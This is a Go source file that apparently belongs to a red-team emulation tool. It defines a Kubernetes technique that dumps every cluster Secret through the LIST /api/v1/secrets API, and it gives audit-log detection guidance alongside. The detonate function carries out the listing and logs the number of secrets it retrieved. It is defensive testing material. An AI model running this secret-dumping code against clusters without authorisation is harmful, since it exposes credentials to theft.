package kubernetes

import (
	"context"
	_ "embed"
	"encoding/json"
	"errors"
	"github.com/datadog/stratus-red-team/internal/providers"
	"github.com/datadog/stratus-red-team/pkg/stratus"
	"github.com/datadog/stratus-red-team/pkg/stratus/mitreattack"
	"log"
	"strconv"
)

func init() {
	const codeBlock = "```"
	stratus.GetRegistry().RegisterAttackTechnique(&stratus.AttackTechnique{
		ID:                 "k8s.credential-access.dump-secrets",
		FriendlyName:       "Dump All Secrets",
		Platform:           stratus.Kubernetes,
		IsIdempotent:       true,
		MitreAttackTactics: []mitreattack.Tactic{mitreattack.CredentialAccess},
		Description: `
Dumps all Secrets from a Kubernetes cluster. 
This allow an attacker with the right permissions to trivially access all secrets in the cluster.

Warm-up: None

Detonation: 

- Dump secrets using the **LIST /api/v1/secrets** API
- This returns all secrets in the K8s clusters, no matter their namespace

References:

- https://darkbit.io/blog/the-power-of-kubernetes-rbac-list
`,
		Detection: `
Using Kubernetes API server audit logs. In particular, look for **list secrets** requests that are performed
for a specific namespace.

Sample event (shortened):

` + codeBlock + `json
{
  "apiVersion": "audit.k8s.io/v1",
  "stage": "ResponseComplete",
  "kind": "Event",
  "level": "Metadata",
  "requestURI": "/api/v1/secrets?limit=500",
  "attributes": {
    "objectRef": {
      "resource": "secrets",
      "apiVersion": "v1"
    },
    "http": {
      "url_details": {
        "path": "/api/v1/secrets",
        "queryString": {
          "limit": "500"
        }
      },
      "method": "list"
    }
  }
}
` + codeBlock + `

Some built-in Kubernetes components might need to be excluded from such a detection:

- namespace-controller
- kube-state-metrics
- apiserver
`,
		Detonate: detonate,
	})
}

func detonate(map[string]string) error {
	client := providers.K8s().GetClient()

	log.Println("Attempting to dump secrets in all namespaces")
	result := client.CoreV1().RESTClient().Get().Resource("secrets").Do(context.Background())
	if result.Error() != nil {
		return errors.New("unable to dump cluster secrets: " + result.Error().Error())
	}

	rawSecrets, err := result.Raw()
	if err != nil {
		return errors.New("unable to dump cluster secrets: " + err.Error())
	}

	var secretsList struct {
		Kind  string        `json:"kind"`
		Items []interface{} `json:"items"`
	}
	err = json.Unmarshal(rawSecrets, &secretsList)
	if err != nil {
		return errors.New("unable to dump cluster secrets, retrieved invalid secrets response " + err.Error())
	}
	numSecrets := len(secretsList.Items)
	log.Println("Successfully dumped " + strconv.Itoa(numSecrets) + " secrets from the cluster")
	return nil
}
